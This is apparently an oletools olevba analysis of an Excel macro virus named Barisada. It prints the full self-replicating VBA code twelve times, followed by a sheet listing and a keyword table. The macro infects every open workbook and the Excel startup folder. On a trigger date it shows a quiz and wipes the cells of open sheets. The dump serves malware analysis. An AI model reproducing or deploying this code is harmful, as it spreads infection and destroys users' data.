olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSExcel.Barisada-24aca1e07045b51a0cef8ed3390a6f508342f122
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisWorkbook.cls 
in file: Virus.MSExcel.Barisada-24aca1e07045b51a0cef8ed3390a6f508342f122 - OLE stream: '_VBA_PROJECT_CUR/VBA/ThisWorkbook'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Private Sub Workbook_WindowDeactivate(ByVal Wn As Excel.Window)
On Error Resume Next
flag = False
 
 myfile = Dir(Application.StartupPath & "\hjb.xls")
 If myfile <> "hjb.xls" Then
   Application.ScreenUpdating = False
   Workbooks.Add.SaveAs FileName:=Application.StartupPath & "\hjb.xls", FileFormat:=xlNormal, addtomru:=False
 End If
 

For i = 1 To Workbooks.Count
  eline = Workbooks(i).VBProject.VBComponents.Item("ThisWorkbook").CodeModule.CountOfLines
  If eline <> o Then vcode = Workbooks(i).VBProject.VBComponents.Item("thisworkbook").CodeModule.Lines(1, eline)
  
  
 For j = 1 To Workbooks(i).VBProject.VBComponents.Count
  vcount = Workbooks(i).VBProject.VBComponents.Item(j).CodeModule.CountOfLines
  If vcount = 0 Then Workbooks(i).VBProject.VBComponents.Item(j).CodeModule.AddFromString (vcode)
 Next j: Next i
  
  
 If myfile <> "hjb.xls" Then Workbooks("hjb.xls").Close savechanges:=True
 


dmonth = Month(Now): dday = Day(Now): dhour = Hour(Now)

If dmonth = 4 And dday = 24 And dhour = 14 Then flag = True

If flag = True Then
  v1 = MsgBox("Question : What is the Sword Which Karl Styner(=Gray Scavenger) used? " & vbCr & _
  "Answer : Barisada ", vbYesNo, "1st Qusetion")
  
  If v1 = vbNo Then MsgBox "Good! You're Authorized now!!", vbOKOnly, "Right Answer"
  If v1 = vbYes Then
     MsgBox "I wil give you one more Chance. Be careful!!", vbOKOnly + vbCritical, "Wrong Answer"
     v2 = MsgBox("Summoning Xavier is the Ultimate Magic. Right?", vbYesNo, "Wrong Answer may cause The Serious Problem!")
     If v2 = vbYes Then MsgBox "ok , i will forgive you", vbOKOnly, "Right Answer"
     If v2 = vbNo Then
       MsgBox "Wrong Answer, Your file will be deleted!", vbOKOnly + vbCritical, "You shall Die"
       For i = 1 To Workbooks.Count
        For j = 1 To Workbooks(i).Sheets.Count
          Workbooks(i).Sheets(i).Cells.Select
          Selection.Clear
       Next j: Next i:
     End If
     
     
  End If
 End If
  
     
  

  

   
 
 

   


End Sub






























































-------------------------------------------------------------------------------
VBA MACRO Sheet1.cls 
in file: Virus.MSExcel.Barisada-24aca1e07045b51a0cef8ed3390a6f508342f122 - OLE stream: '_VBA_PROJECT_CUR/VBA/Sheet1'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Private Sub Workbook_WindowDeactivate(ByVal Wn As Excel.Window)
On Error Resume Next
flag = False
 
 myfile = Dir(Application.StartupPath & "\hjb.xls")
 If myfile <> "hjb.xls" Then
   Application.ScreenUpdating = False
   Workbooks.Add.SaveAs FileName:=Application.StartupPath & "\hjb.xls", FileFormat:=xlNormal, addtomru:=False
 End If
 

For i = 1 To Workbooks.Count
  eline = Workbooks(i).VBProject.VBComponents.Item("ThisWorkbook").CodeModule.CountOfLines
  If eline <> o Then vcode = Workbooks(i).VBProject.VBComponents.Item("thisworkbook").CodeModule.Lines(1, eline)
  
  
 For j = 1 To Workbooks(i).VBProject.VBComponents.Count
  vcount = Workbooks(i).VBProject.VBComponents.Item(j).CodeModule.CountOfLines
  If vcount = 0 Then Workbooks(i).VBProject.VBComponents.Item(j).CodeModule.AddFromString (vcode)
 Next j: Next i
  
  
 If myfile <> "hjb.xls" Then Workbooks("hjb.xls").Close savechanges:=True
 


dmonth = Month(Now): dday = Day(Now): dhour = Hour(Now)

If dmonth = 4 And dday = 24 And dhour = 14 Then flag = True

If flag = True Then
  v1 = MsgBox("Question : What is the Sword Which Karl Styner(=Gray Scavenger) used? " & vbCr & _
  "Answer : Barisada ", vbYesNo, "1st Qusetion")
  
  If v1 = vbNo Then MsgBox "Good! You're Authorized now!!", vbOKOnly, "Right Answer"
  If v1 = vbYes Then
     MsgBox "I wil give you one more Chance. Be careful!!", vbOKOnly + vbCritical, "Wrong Answer"
     v2 = MsgBox("Summoning Xavier is the Ultimate Magic. Right?", vbYesNo, "Wrong Answer may cause The Serious Problem!")
     If v2 = vbYes Then MsgBox "ok , i will forgive you", vbOKOnly, "Right Answer"
     If v2 = vbNo Then
       MsgBox "Wrong Answer, Your file will be deleted!", vbOKOnly + vbCritical, "You shall Die"
       For i = 1 To Workbooks.Count
        For j = 1 To Workbooks(i).Sheets.Count
          Workbooks(i).Sheets(i).Cells.Select
          Selection.Clear
       Next j: Next i:
     End If
     
     
  End If
 End If
  
     
  

  

   
 
 

   


End Sub






























































-------------------------------------------------------------------------------
VBA MACRO Sheet2.cls 
in file: Virus.MSExcel.Barisada-24aca1e07045b51a0cef8ed3390a6f508342f122 - OLE stream: '_VBA_PROJECT_CUR/VBA/Sheet2'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Private Sub Workbook_WindowDeactivate(ByVal Wn As Excel.Window)
On Error Resume Next
flag = False
 
 myfile = Dir(Application.StartupPath & "\hjb.xls")
 If myfile <> "hjb.xls" Then
   Application.ScreenUpdating = False
   Workbooks.Add.SaveAs FileName:=Application.StartupPath & "\hjb.xls", FileFormat:=xlNormal, addtomru:=False
 End If
 

For i = 1 To Workbooks.Count
  eline = Workbooks(i).VBProject.VBComponents.Item("ThisWorkbook").CodeModule.CountOfLines
  If eline <> o Then vcode = Workbooks(i).VBProject.VBComponents.Item("thisworkbook").CodeModule.Lines(1, eline)
  
  
 For j = 1 To Workbooks(i).VBProject.VBComponents.Count
  vcount = Workbooks(i).VBProject.VBComponents.Item(j).CodeModule.CountOfLines
  If vcount = 0 Then Workbooks(i).VBProject.VBComponents.Item(j).CodeModule.AddFromString (vcode)
 Next j: Next i
  
  
 If myfile <> "hjb.xls" Then Workbooks("hjb.xls").Close savechanges:=True
 


dmonth = Month(Now): dday = Day(Now): dhour = Hour(Now)

If dmonth = 4 And dday = 24 And dhour = 14 Then flag = True

If flag = True Then
  v1 = MsgBox("Question : What is the Sword Which Karl Styner(=Gray Scavenger) used? " & vbCr & _
  "Answer : Barisada ", vbYesNo, "1st Qusetion")
  
  If v1 = vbNo Then MsgBox "Good! You're Authorized now!!", vbOKOnly, "Right Answer"
  If v1 = vbYes Then
     MsgBox "I wil give you one more Chance. Be careful!!", vbOKOnly + vbCritical, "Wrong Answer"
     v2 = MsgBox("Summoning Xavier is the Ultimate Magic. Right?", vbYesNo, "Wrong Answer may cause The Serious Problem!")
     If v2 = vbYes Then MsgBox "ok , i will forgive you", vbOKOnly, "Right Answer"
     If v2 = vbNo Then
       MsgBox "Wrong Answer, Your file will be deleted!", vbOKOnly + vbCritical, "You shall Die"
       For i = 1 To Workbooks.Count
        For j = 1 To Workbooks(i).Sheets.Count
          Workbooks(i).Sheets(i).Cells.Select
          Selection.Clear
       Next j: Next i:
     End If
     
     
  End If
 End If
  
     
  

  

   
 
 

   


End Sub






























































-------------------------------------------------------------------------------
VBA MACRO Sheet3.cls 
in file: Virus.MSExcel.Barisada-24aca1e07045b51a0cef8ed3390a6f508342f122 - OLE stream: '_VBA_PROJECT_CUR/VBA/Sheet3'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Private Sub Workbook_WindowDeactivate(ByVal Wn As Excel.Window)
On Error Resume Next
flag = False
 
 myfile = Dir(Application.StartupPath & "\hjb.xls")
 If myfile <> "hjb.xls" Then
   Application.ScreenUpdating = False
   Workbooks.Add.SaveAs FileName:=Application.StartupPath & "\hjb.xls", FileFormat:=xlNormal, addtomru:=False
 End If
 

For i = 1 To Workbooks.Count
  eline = Workbooks(i).VBProject.VBComponents.Item("ThisWorkbook").CodeModule.CountOfLines
  If eline <> o Then vcode = Workbooks(i).VBProject.VBComponents.Item("thisworkbook").CodeModule.Lines(1, eline)
  
  
 For j = 1 To Workbooks(i).VBProject.VBComponents.Count
  vcount = Workbooks(i).VBProject.VBComponents.Item(j).CodeModule.CountOfLines
  If vcount = 0 Then Workbooks(i).VBProject.VBComponents.Item(j).CodeModule.AddFromString (vcode)
 Next j: Next i
  
  
 If myfile <> "hjb.xls" Then Workbooks("hjb.xls").Close savechanges:=True
 


dmonth = Month(Now): dday = Day(Now): dhour = Hour(Now)

If dmonth = 4 And dday = 24 And dhour = 14 Then flag = True

If flag = True Then
  v1 = MsgBox("Question : What is the Sword Which Karl Styner(=Gray Scavenger) used? " & vbCr & _
  "Answer : Barisada ", vbYesNo, "1st Qusetion")
  
  If v1 = vbNo Then MsgBox "Good! You're Authorized now!!", vbOKOnly, "Right Answer"
  If v1 = vbYes Then
     MsgBox "I wil give you one more Chance. Be careful!!", vbOKOnly + vbCritical, "Wrong Answer"
     v2 = MsgBox("Summoning Xavier is the Ultimate Magic. Right?", vbYesNo, "Wrong Answer may cause The Serious Problem!")
     If v2 = vbYes Then MsgBox "ok , i will forgive you", vbOKOnly, "Right Answer"
     If v2 = vbNo Then
       MsgBox "Wrong Answer, Your file will be deleted!", vbOKOnly + vbCritical, "You shall Die"
       For i = 1 To Workbooks.Count
        For j = 1 To Workbooks(i).Sheets.Count
          Workbooks(i).Sheets(i).Cells.Select
          Selection.Clear
       Next j: Next i:
     End If
     
     
  End If
 End If
  
     
  

  

   
 
 

   


End Sub






























































-------------------------------------------------------------------------------
VBA MACRO Sheet4.cls 
in file: Virus.MSExcel.Barisada-24aca1e07045b51a0cef8ed3390a6f508342f122 - OLE stream: '_VBA_PROJECT_CUR/VBA/Sheet4'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Private Sub Workbook_WindowDeactivate(ByVal Wn As Excel.Window)
On Error Resume Next
flag = False
 
 myfile = Dir(Application.StartupPath & "\hjb.xls")
 If myfile <> "hjb.xls" Then
   Application.ScreenUpdating = False
   Workbooks.Add.SaveAs FileName:=Application.StartupPath & "\hjb.xls", FileFormat:=xlNormal, addtomru:=False
 End If
 

For i = 1 To Workbooks.Count
  eline = Workbooks(i).VBProject.VBComponents.Item("ThisWorkbook").CodeModule.CountOfLines
  If eline <> o Then vcode = Workbooks(i).VBProject.VBComponents.Item("thisworkbook").CodeModule.Lines(1, eline)
  
  
 For j = 1 To Workbooks(i).VBProject.VBComponents.Count
  vcount = Workbooks(i).VBProject.VBComponents.Item(j).CodeModule.CountOfLines
  If vcount = 0 Then Workbooks(i).VBProject.VBComponents.Item(j).CodeModule.AddFromString (vcode)
 Next j: Next i
  
  
 If myfile <> "hjb.xls" Then Workbooks("hjb.xls").Close savechanges:=True
 


dmonth = Month(Now): dday = Day(Now): dhour = Hour(Now)

If dmonth = 4 And dday = 24 And dhour = 14 Then flag = True

If flag = True Then
  v1 = MsgBox("Question : What is the Sword Which Karl Styner(=Gray Scavenger) used? " & vbCr & _
  "Answer : Barisada ", vbYesNo, "1st Qusetion")
  
  If v1 = vbNo Then MsgBox "Good! You're Authorized now!!", vbOKOnly, "Right Answer"
  If v1 = vbYes Then
     MsgBox "I wil give you one more Chance. Be careful!!", vbOKOnly + vbCritical, "Wrong Answer"
     v2 = MsgBox("Summoning Xavier is the Ultimate Magic. Right?", vbYesNo, "Wrong Answer may cause The Serious Problem!")
     If v2 = vbYes Then MsgBox "ok , i will forgive you", vbOKOnly, "Right Answer"
     If v2 = vbNo Then
       MsgBox "Wrong Answer, Your file will be deleted!", vbOKOnly + vbCritical, "You shall Die"
       For i = 1 To Workbooks.Count
        For j = 1 To Workbooks(i).Sheets.Count
          Workbooks(i).Sheets(i).Cells.Select
          Selection.Clear
       Next j: Next i:
     End If
     
     
  End If
 End If
  
     
  

  

   
 
 

   


End Sub






























































-------------------------------------------------------------------------------
VBA MACRO Sheet5.cls 
in file: Virus.MSExcel.Barisada-24aca1e07045b51a0cef8ed3390a6f508342f122 - OLE stream: '_VBA_PROJECT_CUR/VBA/Sheet5'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Private Sub Workbook_WindowDeactivate(ByVal Wn As Excel.Window)
On Error Resume Next
flag = False
 
 myfile = Dir(Application.StartupPath & "\hjb.xls")
 If myfile <> "hjb.xls" Then
   Application.ScreenUpdating = False
   Workbooks.Add.SaveAs FileName:=Application.StartupPath & "\hjb.xls", FileFormat:=xlNormal, addtomru:=False
 End If
 

For i = 1 To Workbooks.Count
  eline = Workbooks(i).VBProject.VBComponents.Item("ThisWorkbook").CodeModule.CountOfLines
  If eline <> o Then vcode = Workbooks(i).VBProject.VBComponents.Item("thisworkbook").CodeModule.Lines(1, eline)
  
  
 For j = 1 To Workbooks(i).VBProject.VBComponents.Count
  vcount = Workbooks(i).VBProject.VBComponents.Item(j).CodeModule.CountOfLines
  If vcount = 0 Then Workbooks(i).VBProject.VBComponents.Item(j).CodeModule.AddFromString (vcode)
 Next j: Next i
  
  
 If myfile <> "hjb.xls" Then Workbooks("hjb.xls").Close savechanges:=True
 


dmonth = Month(Now): dday = Day(Now): dhour = Hour(Now)

If dmonth = 4 And dday = 24 And dhour = 14 Then flag = True

If flag = True Then
  v1 = MsgBox("Question : What is the Sword Which Karl Styner(=Gray Scavenger) used? " & vbCr & _
  "Answer : Barisada ", vbYesNo, "1st Qusetion")
  
  If v1 = vbNo Then MsgBox "Good! You're Authorized now!!", vbOKOnly, "Right Answer"
  If v1 = vbYes Then
     MsgBox "I wil give you one more Chance. Be careful!!", vbOKOnly + vbCritical, "Wrong Answer"
     v2 = MsgBox("Summoning Xavier is the Ultimate Magic. Right?", vbYesNo, "Wrong Answer may cause The Serious Problem!")
     If v2 = vbYes Then MsgBox "ok , i will forgive you", vbOKOnly, "Right Answer"
     If v2 = vbNo Then
       MsgBox "Wrong Answer, Your file will be deleted!", vbOKOnly + vbCritical, "You shall Die"
       For i = 1 To Workbooks.Count
        For j = 1 To Workbooks(i).Sheets.Count
          Workbooks(i).Sheets(i).Cells.Select
          Selection.Clear
       Next j: Next i:
     End If
     
     
  End If
 End If
  
     
  

  

   
 
 

   


End Sub






























































-------------------------------------------------------------------------------
VBA MACRO Sheet6.cls 
in file: Virus.MSExcel.Barisada-24aca1e07045b51a0cef8ed3390a6f508342f122 - OLE stream: '_VBA_PROJECT_CUR/VBA/Sheet6'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Private Sub Workbook_WindowDeactivate(ByVal Wn As Excel.Window)
On Error Resume Next
flag = False
 
 myfile = Dir(Application.StartupPath & "\hjb.xls")
 If myfile <> "hjb.xls" Then
   Application.ScreenUpdating = False
   Workbooks.Add.SaveAs FileName:=Application.StartupPath & "\hjb.xls", FileFormat:=xlNormal, addtomru:=False
 End If
 

For i = 1 To Workbooks.Count
  eline = Workbooks(i).VBProject.VBComponents.Item("ThisWorkbook").CodeModule.CountOfLines
  If eline <> o Then vcode = Workbooks(i).VBProject.VBComponents.Item("thisworkbook").CodeModule.Lines(1, eline)
  
  
 For j = 1 To Workbooks(i).VBProject.VBComponents.Count
  vcount = Workbooks(i).VBProject.VBComponents.Item(j).CodeModule.CountOfLines
  If vcount = 0 Then Workbooks(i).VBProject.VBComponents.Item(j).CodeModule.AddFromString (vcode)
 Next j: Next i
  
  
 If myfile <> "hjb.xls" Then Workbooks("hjb.xls").Close savechanges:=True
 


dmonth = Month(Now): dday = Day(Now): dhour = Hour(Now)

If dmonth = 4 And dday = 24 And dhour = 14 Then flag = True

If flag = True Then
  v1 = MsgBox("Question : What is the Sword Which Karl Styner(=Gray Scavenger) used? " & vbCr & _
  "Answer : Barisada ", vbYesNo, "1st Qusetion")
  
  If v1 = vbNo Then MsgBox "Good! You're Authorized now!!", vbOKOnly, "Right Answer"
  If v1 = vbYes Then
     MsgBox "I wil give you one more Chance. Be careful!!", vbOKOnly + vbCritical, "Wrong Answer"
     v2 = MsgBox("Summoning Xavier is the Ultimate Magic. Right?", vbYesNo, "Wrong Answer may cause The Serious Problem!")
     If v2 = vbYes Then MsgBox "ok , i will forgive you", vbOKOnly, "Right Answer"
     If v2 = vbNo Then
       MsgBox "Wrong Answer, Your file will be deleted!", vbOKOnly + vbCritical, "You shall Die"
       For i = 1 To Workbooks.Count
        For j = 1 To Workbooks(i).Sheets.Count
          Workbooks(i).Sheets(i).Cells.Select
          Selection.Clear
       Next j: Next i:
     End If
     
     
  End If
 End If
  
     
  

  

   
 
 

   


End Sub






























































-------------------------------------------------------------------------------
VBA MACRO Sheet7.cls 
in file: Virus.MSExcel.Barisada-24aca1e07045b51a0cef8ed3390a6f508342f122 - OLE stream: '_VBA_PROJECT_CUR/VBA/Sheet7'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Private Sub Workbook_WindowDeactivate(ByVal Wn As Excel.Window)
On Error Resume Next
flag = False
 
 myfile = Dir(Application.StartupPath & "\hjb.xls")
 If myfile <> "hjb.xls" Then
   Application.ScreenUpdating = False
   Workbooks.Add.SaveAs FileName:=Application.StartupPath & "\hjb.xls", FileFormat:=xlNormal, addtomru:=False
 End If
 

For i = 1 To Workbooks.Count
  eline = Workbooks(i).VBProject.VBComponents.Item("ThisWorkbook").CodeModule.CountOfLines
  If eline <> o Then vcode = Workbooks(i).VBProject.VBComponents.Item("thisworkbook").CodeModule.Lines(1, eline)
  
  
 For j = 1 To Workbooks(i).VBProject.VBComponents.Count
  vcount = Workbooks(i).VBProject.VBComponents.Item(j).CodeModule.CountOfLines
  If vcount = 0 Then Workbooks(i).VBProject.VBComponents.Item(j).CodeModule.AddFromString (vcode)
 Next j: Next i
  
  
 If myfile <> "hjb.xls" Then Workbooks("hjb.xls").Close savechanges:=True
 


dmonth = Month(Now): dday = Day(Now): dhour = Hour(Now)

If dmonth = 4 And dday = 24 And dhour = 14 Then flag = True

If flag = True Then
  v1 = MsgBox("Question : What is the Sword Which Karl Styner(=Gray Scavenger) used? " & vbCr & _
  "Answer : Barisada ", vbYesNo, "1st Qusetion")
  
  If v1 = vbNo Then MsgBox "Good! You're Authorized now!!", vbOKOnly, "Right Answer"
  If v1 = vbYes Then
     MsgBox "I wil give you one more Chance. Be careful!!", vbOKOnly + vbCritical, "Wrong Answer"
     v2 = MsgBox("Summoning Xavier is the Ultimate Magic. Right?", vbYesNo, "Wrong Answer may cause The Serious Problem!")
     If v2 = vbYes Then MsgBox "ok , i will forgive you", vbOKOnly, "Right Answer"
     If v2 = vbNo Then
       MsgBox "Wrong Answer, Your file will be deleted!", vbOKOnly + vbCritical, "You shall Die"
       For i = 1 To Workbooks.Count
        For j = 1 To Workbooks(i).Sheets.Count
          Workbooks(i).Sheets(i).Cells.Select
          Selection.Clear
       Next j: Next i:
     End If
     
     
  End If
 End If
  
     
  

  

   
 
 

   


End Sub






























































-------------------------------------------------------------------------------
VBA MACRO Sheet8.cls 
in file: Virus.MSExcel.Barisada-24aca1e07045b51a0cef8ed3390a6f508342f122 - OLE stream: '_VBA_PROJECT_CUR/VBA/Sheet8'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Private Sub Workbook_WindowDeactivate(ByVal Wn As Excel.Window)
On Error Resume Next
flag = False
 
 myfile = Dir(Application.StartupPath & "\hjb.xls")
 If myfile <> "hjb.xls" Then
   Application.ScreenUpdating = False
   Workbooks.Add.SaveAs FileName:=Application.StartupPath & "\hjb.xls", FileFormat:=xlNormal, addtomru:=False
 End If
 

For i = 1 To Workbooks.Count
  eline = Workbooks(i).VBProject.VBComponents.Item("ThisWorkbook").CodeModule.CountOfLines
  If eline <> o Then vcode = Workbooks(i).VBProject.VBComponents.Item("thisworkbook").CodeModule.Lines(1, eline)
  
  
 For j = 1 To Workbooks(i).VBProject.VBComponents.Count
  vcount = Workbooks(i).VBProject.VBComponents.Item(j).CodeModule.CountOfLines
  If vcount = 0 Then Workbooks(i).VBProject.VBComponents.Item(j).CodeModule.AddFromString (vcode)
 Next j: Next i
  
  
 If myfile <> "hjb.xls" Then Workbooks("hjb.xls").Close savechanges:=True
 


dmonth = Month(Now): dday = Day(Now): dhour = Hour(Now)

If dmonth = 4 And dday = 24 And dhour = 14 Then flag = True

If flag = True Then
  v1 = MsgBox("Question : What is the Sword Which Karl Styner(=Gray Scavenger) used? " & vbCr & _
  "Answer : Barisada ", vbYesNo, "1st Qusetion")
  
  If v1 = vbNo Then MsgBox "Good! You're Authorized now!!", vbOKOnly, "Right Answer"
  If v1 = vbYes Then
     MsgBox "I wil give you one more Chance. Be careful!!", vbOKOnly + vbCritical, "Wrong Answer"
     v2 = MsgBox("Summoning Xavier is the Ultimate Magic. Right?", vbYesNo, "Wrong Answer may cause The Serious Problem!")
     If v2 = vbYes Then MsgBox "ok , i will forgive you", vbOKOnly, "Right Answer"
     If v2 = vbNo Then
       MsgBox "Wrong Answer, Your file will be deleted!", vbOKOnly + vbCritical, "You shall Die"
       For i = 1 To Workbooks.Count
        For j = 1 To Workbooks(i).Sheets.Count
          Workbooks(i).Sheets(i).Cells.Select
          Selection.Clear
       Next j: Next i:
     End If
     
     
  End If
 End If
  
     
  

  

   
 
 

   


End Sub






























































-------------------------------------------------------------------------------
VBA MACRO Sheet9.cls 
in file: Virus.MSExcel.Barisada-24aca1e07045b51a0cef8ed3390a6f508342f122 - OLE stream: '_VBA_PROJECT_CUR/VBA/Sheet9'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Private Sub Workbook_WindowDeactivate(ByVal Wn As Excel.Window)
On Error Resume Next
flag = False
 
 myfile = Dir(Application.StartupPath & "\hjb.xls")
 If myfile <> "hjb.xls" Then
   Application.ScreenUpdating = False
   Workbooks.Add.SaveAs FileName:=Application.StartupPath & "\hjb.xls", FileFormat:=xlNormal, addtomru:=False
 End If
 

For i = 1 To Workbooks.Count
  eline = Workbooks(i).VBProject.VBComponents.Item("ThisWorkbook").CodeModule.CountOfLines
  If eline <> o Then vcode = Workbooks(i).VBProject.VBComponents.Item("thisworkbook").CodeModule.Lines(1, eline)
  
  
 For j = 1 To Workbooks(i).VBProject.VBComponents.Count
  vcount = Workbooks(i).VBProject.VBComponents.Item(j).CodeModule.CountOfLines
  If vcount = 0 Then Workbooks(i).VBProject.VBComponents.Item(j).CodeModule.AddFromString (vcode)
 Next j: Next i
  
  
 If myfile <> "hjb.xls" Then Workbooks("hjb.xls").Close savechanges:=True
 


dmonth = Month(Now): dday = Day(Now): dhour = Hour(Now)

If dmonth = 4 And dday = 24 And dhour = 14 Then flag = True

If flag = True Then
  v1 = MsgBox("Question : What is the Sword Which Karl Styner(=Gray Scavenger) used? " & vbCr & _
  "Answer : Barisada ", vbYesNo, "1st Qusetion")
  
  If v1 = vbNo Then MsgBox "Good! You're Authorized now!!", vbOKOnly, "Right Answer"
  If v1 = vbYes Then
     MsgBox "I wil give you one more Chance. Be careful!!", vbOKOnly + vbCritical, "Wrong Answer"
     v2 = MsgBox("Summoning Xavier is the Ultimate Magic. Right?", vbYesNo, "Wrong Answer may cause The Serious Problem!")
     If v2 = vbYes Then MsgBox "ok , i will forgive you", vbOKOnly, "Right Answer"
     If v2 = vbNo Then
       MsgBox "Wrong Answer, Your file will be deleted!", vbOKOnly + vbCritical, "You shall Die"
       For i = 1 To Workbooks.Count
        For j = 1 To Workbooks(i).Sheets.Count
          Workbooks(i).Sheets(i).Cells.Select
          Selection.Clear
       Next j: Next i:
     End If
     
     
  End If
 End If
  
     
  

  

   
 
 

   


End Sub






























































-------------------------------------------------------------------------------
VBA MACRO Sheet10.cls 
in file: Virus.MSExcel.Barisada-24aca1e07045b51a0cef8ed3390a6f508342f122 - OLE stream: '_VBA_PROJECT_CUR/VBA/Sheet10'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Private Sub Workbook_WindowDeactivate(ByVal Wn As Excel.Window)
On Error Resume Next
flag = False
 
 myfile = Dir(Application.StartupPath & "\hjb.xls")
 If myfile <> "hjb.xls" Then
   Application.ScreenUpdating = False
   Workbooks.Add.SaveAs FileName:=Application.StartupPath & "\hjb.xls", FileFormat:=xlNormal, addtomru:=False
 End If
 

For i = 1 To Workbooks.Count
  eline = Workbooks(i).VBProject.VBComponents.Item("ThisWorkbook").CodeModule.CountOfLines
  If eline <> o Then vcode = Workbooks(i).VBProject.VBComponents.Item("thisworkbook").CodeModule.Lines(1, eline)
  
  
 For j = 1 To Workbooks(i).VBProject.VBComponents.Count
  vcount = Workbooks(i).VBProject.VBComponents.Item(j).CodeModule.CountOfLines
  If vcount = 0 Then Workbooks(i).VBProject.VBComponents.Item(j).CodeModule.AddFromString (vcode)
 Next j: Next i
  
  
 If myfile <> "hjb.xls" Then Workbooks("hjb.xls").Close savechanges:=True
 


dmonth = Month(Now): dday = Day(Now): dhour = Hour(Now)

If dmonth = 4 And dday = 24 And dhour = 14 Then flag = True

If flag = True Then
  v1 = MsgBox("Question : What is the Sword Which Karl Styner(=Gray Scavenger) used? " & vbCr & _
  "Answer : Barisada ", vbYesNo, "1st Qusetion")
  
  If v1 = vbNo Then MsgBox "Good! You're Authorized now!!", vbOKOnly, "Right Answer"
  If v1 = vbYes Then
     MsgBox "I wil give you one more Chance. Be careful!!", vbOKOnly + vbCritical, "Wrong Answer"
     v2 = MsgBox("Summoning Xavier is the Ultimate Magic. Right?", vbYesNo, "Wrong Answer may cause The Serious Problem!")
     If v2 = vbYes Then MsgBox "ok , i will forgive you", vbOKOnly, "Right Answer"
     If v2 = vbNo Then
       MsgBox "Wrong Answer, Your file will be deleted!", vbOKOnly + vbCritical, "You shall Die"
       For i = 1 To Workbooks.Count
        For j = 1 To Workbooks(i).Sheets.Count
          Workbooks(i).Sheets(i).Cells.Select
          Selection.Clear
       Next j: Next i:
     End If
     
     
  End If
 End If
  
     
  

  

   
 
 

   


End Sub






























































-------------------------------------------------------------------------------
VBA MACRO Sheet11.cls 
in file: Virus.MSExcel.Barisada-24aca1e07045b51a0cef8ed3390a6f508342f122 - OLE stream: '_VBA_PROJECT_CUR/VBA/Sheet11'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Private Sub Workbook_WindowDeactivate(ByVal Wn As Excel.Window)
On Error Resume Next
flag = False
 
 myfile = Dir(Application.StartupPath & "\hjb.xls")
 If myfile <> "hjb.xls" Then
   Application.ScreenUpdating = False
   Workbooks.Add.SaveAs FileName:=Application.StartupPath & "\hjb.xls", FileFormat:=xlNormal, addtomru:=False
 End If
 

For i = 1 To Workbooks.Count
  eline = Workbooks(i).VBProject.VBComponents.Item("ThisWorkbook").CodeModule.CountOfLines
  If eline <> o Then vcode = Workbooks(i).VBProject.VBComponents.Item("thisworkbook").CodeModule.Lines(1, eline)
  
  
 For j = 1 To Workbooks(i).VBProject.VBComponents.Count
  vcount = Workbooks(i).VBProject.VBComponents.Item(j).CodeModule.CountOfLines
  If vcount = 0 Then Workbooks(i).VBProject.VBComponents.Item(j).CodeModule.AddFromString (vcode)
 Next j: Next i
  
  
 If myfile <> "hjb.xls" Then Workbooks("hjb.xls").Close savechanges:=True
 


dmonth = Month(Now): dday = Day(Now): dhour = Hour(Now)

If dmonth = 4 And dday = 24 And dhour = 14 Then flag = True

If flag = True Then
  v1 = MsgBox("Question : What is the Sword Which Karl Styner(=Gray Scavenger) used? " & vbCr & _
  "Answer : Barisada ", vbYesNo, "1st Qusetion")
  
  If v1 = vbNo Then MsgBox "Good! You're Authorized now!!", vbOKOnly, "Right Answer"
  If v1 = vbYes Then
     MsgBox "I wil give you one more Chance. Be careful!!", vbOKOnly + vbCritical, "Wrong Answer"
     v2 = MsgBox("Summoning Xavier is the Ultimate Magic. Right?", vbYesNo, "Wrong Answer may cause The Serious Problem!")
     If v2 = vbYes Then MsgBox "ok , i will forgive you", vbOKOnly, "Right Answer"
     If v2 = vbNo Then
       MsgBox "Wrong Answer, Your file will be deleted!", vbOKOnly + vbCritical, "You shall Die"
       For i = 1 To Workbooks.Count
        For j = 1 To Workbooks(i).Sheets.Count
          Workbooks(i).Sheets(i).Cells.Select
          Selection.Clear
       Next j: Next i:
     End If
     
     
  End If
 End If
  
     
  

  

   
 
 

   


End Sub































































-------------------------------------------------------------------------------
VBA MACRO xlm_macro.txt 
in file: xlm_macro - OLE stream: 'xlm_macro'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' 0085     11 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  P&
' 0085     15 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Form I
' 0085     18 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  SH PREMIU
' 0085     16 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Form II
' 0085     20 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Form III (2
' 0085     16 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Form IV
' 0085     11 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  WC
' 0085     15 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Form V
' 0085     15 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Form V
' 0085     11 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  CM
' 0085     13 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Form
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
